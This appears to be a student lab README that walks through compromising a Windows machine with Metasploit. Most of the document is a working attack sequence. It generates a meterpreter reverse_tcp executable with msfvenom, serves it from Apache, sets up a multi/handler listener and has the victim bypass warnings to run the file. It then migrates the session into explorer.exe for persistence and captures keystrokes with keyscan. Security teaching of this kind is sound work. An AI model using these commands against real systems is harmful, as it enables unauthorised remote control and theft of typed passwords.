# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![02 kali](https://github.com/user-attachments/assets/1f769597-d562-47f7-b913-49780739c387)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2024-10-28 165041](https://github.com/user-attachments/assets/6e6ce175-d228-4296-9187-2243d95740fe)





copy the fun.exe into the apache /var/www/html folder

![Screenshot 2024-10-28 165210](https://github.com/user-attachments/assets/f51a77f8-f404-4516-9f51-3a7af60d80c3)



Start apache server
sudo systemctl apache2 start

![Screenshot 2024-10-28 165252](https://github.com/user-attachments/assets/846e8a42-b95d-4a8c-914d-f3f8c8ad49d1)


Check the status of apache2
![Screenshot 2024-10-28 165332](https://github.com/user-attachments/assets/b954f796-eac3-4f1e-8771-deee7c8cb678)


Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/fee0700e-bafd-4e76-af72-f5ac23a5d6ba)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![9](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/85fb473c-59fe-4042-b163-552fddc735d1)



keyscan_dump	Shows the keystrokes captured so far
![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)



## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
